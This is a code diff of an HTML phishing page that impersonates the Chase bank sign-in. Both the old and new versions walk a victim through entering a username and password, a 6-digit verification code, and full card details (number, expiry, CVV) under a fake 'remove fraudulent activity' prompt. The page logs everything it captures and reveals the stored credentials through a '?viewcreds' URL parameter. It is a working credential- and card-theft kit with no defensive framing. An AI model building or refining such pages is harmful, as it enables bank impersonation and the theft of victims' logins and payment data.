@@ -1,218 +1,258 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chase Online - Sign In</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background: url('https://www.chase.com/etc/designs/chase/images/backgrounds/login-bg.jpg') no-repeat center center fixed;
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 30px;
-            border-radius: 8px;
-            width: 400px;
-            text-align: center;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        .header {
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            font-size: 24px;
-            color: #003087;
-            margin: 0;
-            font-weight: normal;
-            text-align: left;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: none;
-            border-bottom: 2px solid #ccc;
-            box-sizing: border-box;
-            font-size: 14px;
-            background: transparent;
-        }
-        input:focus {
-            border-bottom: 2px solid #003087;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #003087;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            margin: 20px 0;
-        }
-        button:hover {
-            background-color: #002766;
-        }
-        #message {
-            color: #d9534f;
-            margin: 10px 0;
-            display: none;
-            font-size: 14px;
-        }
-        #credsDisplay {
-            display: none;
-            color: black;
-            background: white;
-            padding: 15px;
-            margin-top: 20px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-        }
-        .checkbox {
-            text-align: left;
-            font-size: 12px;
-            margin: 10px 0;
-        }
-        .checkbox input {
-            width: auto;
-            margin-right: 5px;
-            border: none;
-        }
-        .links {
-            text-align: left;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        .links a {
-            color: #003087;
-            text-decoration: none;
-        }
-        .links a:hover {
-            text-decoration: underline;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase Online - Sign In</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://via.placeholder.com/1080x1920?text=Blurred+Foggy+Landscape') no-repeat center center fixed;
+      background-size: cover;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      position: relative;
+      text-align: center;
+      padding: 20px;
+      width: 100%;
+    }
+    .header {
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .login-box {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 20px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 350px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      margin: 0 auto;
+    }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .form-group label {
+      display: block;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 8px;
+      border: none;
+      border-bottom: 2px solid #0054a6;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+    }
+    .form-group .show-toggle {
+      float: right;
+      color: #0054a6;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .checkbox-group {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      font-size: 12px;
+      color: #666;
+    }
+    .checkbox-group input {
+      margin-right: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0054a6;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #003d7a;
+    }
+    .links a {
+      display: block;
+      margin: 10px 0;
+      color: #0054a6;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .social {
+      margin: 20px 0;
+      font-size: 14px;
+      color: #666;
+    }
+    .social a {
+      color: #666;
+      margin: 0 5px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+    .footer {
+      font-size: 10px;
+      color: #666;
+      margin-top: 20px;
+    }
+    .footer a {
+      color: #666;
+      margin: 0 5px;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .hidden {
+      display: none;
+    }
+    .prompt {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 15px;
+    }
+    .card-group {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Chase</h1>
+  <div class="container">
+    <div class="header">CHASE</div>
+    <div class="login-box">
+      <div id="login-step">
+        <form id="login-form">
+          <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" placeholder="Username" required>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <span class="show-toggle" onclick="togglePassword('password')">Show</span>
+          </div>
+          <div class="checkbox-group">
+            <label><input type="checkbox" name="remember"> Remember me</label>
+            <label><input type="checkbox" name="use-token"> Use token</label>
+          </div>
+          <button type="submit">Sign in</button>
+        </form>
+        <div class="links">
+          <a href="#">Forgot username/password? ></a>
+          <a href="#">Not Enrolled? Sign Up Now. ></a>
         </div>
-        <div id="loginStep1">
-            <input type="text" id="username" placeholder="Username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <span class="links" style="float: right; font-size: 12px; color: #003087;">Show</span>
-            <div class="checkbox">
-                <input type="checkbox" id="remember">
-                <label for="remember">Remember me</label>
+      </div>
+
+      <div id="code-step" class="hidden">
+        <div class="prompt">A 6-digit code has been sent to your device. Enter it below to verify.</div>
+        <form id="code-form">
+          <div class="form-group">
+            <label for="code">6-Digit Code</label>
+            <input type="text" id="code" name="code" placeholder="Enter code" maxlength="6" required>
+          </div>
+          <button type="submit">Verify</button>
+        </form>
+      </div>
+
+      <div id="card-step" class="hidden">
+        <div class="prompt">To lift the fraudulent activity off your account, enter your card credentials below.</div>
+        <form id="card-form">
+          <div class="form-group">
+            <label for="card-name">Name on Card</label>
+            <input type="text" id="card-name" name="card-name" placeholder="Name on Card" required>
+          </div>
+          <div class="form-group">
+            <label for="card-number">Card Number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="Card Number" maxlength="16" required>
+          </div>
+          <div class="card-group">
+            <div class="form-group">
+              <label for="expiration">Expiration Date</label>
+              <input type="text" id="expiration" name="expiration" placeholder="MM/YY" maxlength="5" required>
             </div>
-            <div class="checkbox">
-                <input type="checkbox" id="token">
-                <label for="token">Use token</label>
+            <div class="form-group">
+              <label for="cvv">CVV</label>
+              <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
             </div>
-            <button onclick="verifyUsername()">Sign in</button>
-            <div class="links">
-                <a href="#">Forgot username/password?</a><br>
-                <a href="#">Not Enrolled? Sign Up Now.</a>
-            </div>
-        </div>
-        <div id="codeStep" style="display: none;">
-            <p>We’ve sent a 6-digit code to your registered device. Enter it below.</p>
-            <input type="text" id="code" placeholder="6-Digit Code" maxlength="6" required>
-            <button onclick="verifyCode()">Submit</button>
-        </div>
-        <div id="cardStep" style="display: none;">
-            <p>Final step to remove fraudulent activity on your account.</p>
-            <input type="text" id="cardNumber" placeholder="Credit Card Number (16 digits)" maxlength="16" required>
-            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-            <input type="text" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
-            <button onclick="submitCard()">Submit</button>
-        </div>
-        <div id="message"></div>
-        <div id="credsDisplay"></div>
+          </div>
+          <button type="submit">Submit</button>
+        </form>
+      </div>
+
+      <div class="social">
+        Follow us: <a href="#">&#xf09a;</a> <a href="#">&#xf16d;</a> <a href="#">&#xf17e;</a> <a href="#">&#xf0e1;</a>
+      </div>
+      <div class="footer">
+        <a href="#">Contact us</a> <a href="#">Privacy</a> <a href="#">Security</a> <a href="#">Terms of use</a> <a href="#">Accessibility</a><br>
+        <a href="#">SAFE Act: Chase Mortgage Loan Originators</a> <a href="#">Fair Lending</a> <a href="#">About Chase</a><br>
+        <a href="#">J.P. Morgan</a> <a href="#">JPMorgan Chase & Co.</a> <a href="#">Careers</a> <a href="#">Español</a>
+      </div>
     </div>
+  </div>
+  <script>
+    let creds = localStorage.getItem('credentials') ? localStorage.getItem('credentials').split('\n') : [];
 
-    <script>
-        let creds = [];
+    function togglePassword(id) {
+      const field = document.getElementById(id);
+      field.type = field.type === 'password' ? 'text' : 'password';
+    }
 
-        function verifyUsername() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            if (username && password) {
-                document.getElementById('loginStep1').style.display = 'none';
-                document.getElementById('codeStep').style.display = 'block';
-                document.getElementById('message').style.display = 'none';
-            } else {
-                document.getElementById('message').innerText = 'Please enter username and password.';
-                document.getElementById('message').style.display = 'block';
-            }
-        }
+    document.getElementById('login-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      creds.push(`Username: ${username}, Password: ${password}`);
+      localStorage.setItem('credentials', creds.join('\n'));
+      document.getElementById('login-step').classList.add('hidden');
+      document.getElementById('code-step').classList.remove('hidden');
+    });
 
-        function verifyCode() {
-            const code = document.getElementById('code').value;
-            if (code.length === 6 && /^\d+$/.test(code)) {
-                document.getElementById('codeStep').style.display = 'none';
-                document.getElementById('cardStep').style.display = 'block';
-                document.getElementById('message').style.display = 'none';
-            } else {
-                document.getElementById('message').innerText = 'Invalid 6-digit code.';
-                document.getElementById('message').style.display = 'block';
-            }
-        }
+    document.getElementById('code-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = document.getElementById('code').value;
+      creds.push(`Code: ${code}`);
+      localStorage.setItem('credentials', creds.join('\n'));
+      document.getElementById('code-step').classList.add('hidden');
+      document.getElementById('card-step').classList.remove('hidden');
+    });
 
-        function submitCard() {
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-            if (cardNumber.length === 16 && /^\d+$/.test(cardNumber) && 
-                expiry.length === 5 && /^(\d{2})\/(\d{2})$/.test(expiry) && 
-                cvv.length === 3 && /^\d+$/.test(cvv)) {
-                const credEntry = {
-                    username: document.getElementById('username').value,
-                    password: document.getElementById('password').value,
-                    cardNumber: cardNumber,
-                    expiry: expiry,
-                    cvv: cvv,
-                    timestamp: new Date().toISOString()
-                };
-                creds.push(credEntry);
-                document.getElementById('cardStep').style.display = 'none';
-                document.getElementById('message').innerText = 'Credentials submitted. Thank you for securing your account.';
-                document.getElementById('message').style.display = 'block';
-            } else {
-                document.getElementById('message').innerText = 'Invalid card details. Ensure 16-digit card, MM/YY, and 3-digit CVV.';
-                document.getElementById('message').style.display = 'block';
-            }
-        }
+    document.getElementById('card-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const cardName = document.getElementById('card-name').value;
+      const cardNumber = document.getElementById('card-number').value;
+      const expiration = document.getElementById('expiration').value;
+      const cvv = document.getElementById('cvv').value;
+      creds.push(`Card Name: ${cardName}, Number: ${cardNumber}, Exp: ${expiration}, CVV: ${cvv}`);
+      localStorage.setItem('credentials', creds.join('\n'));
+      alert('Account verified. Thank you.');
+      // Redirect or reset
+      window.location.reload();
+    });
 
-        // View creds via ?viewcreds
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('viewcreds')) {
-            if (creds.length > 0) {
-                let credsHtml = '<h3>Logged Credentials:</h3><ul>';
-                creds.forEach(cred => {
-                    credsHtml += `<li>Username: ${cred.username}, Password: ${cred.password}, Card: ${cred.cardNumber}, Exp: ${cred.expiry}, CVV: ${cred.cvv}, Time: ${cred.timestamp}</li>`;
-                });
-                credsHtml += '</ul>';
-                document.getElementById('credsDisplay').innerHTML = credsHtml;
-                document.getElementById('credsDisplay').style.display = 'block';
-                document.getElementById('loginStep1').style.display = 'none';
-                document.getElementById('codeStep').style.display = 'none';
-                document.getElementById('cardStep').style.display = 'none';
-            } else {
-                document.getElementById('credsDisplay').innerText = 'No credentials logged yet.';
-                document.getElementById('credsDisplay').style.display = 'block';
-            }
-        }
-    </script>
+    if (window.location.search === '?viewcreds') {
+      alert(localStorage.getItem('credentials') || 'No credentials captured yet.');
+    }
+  </script>
 </body>
 </html>
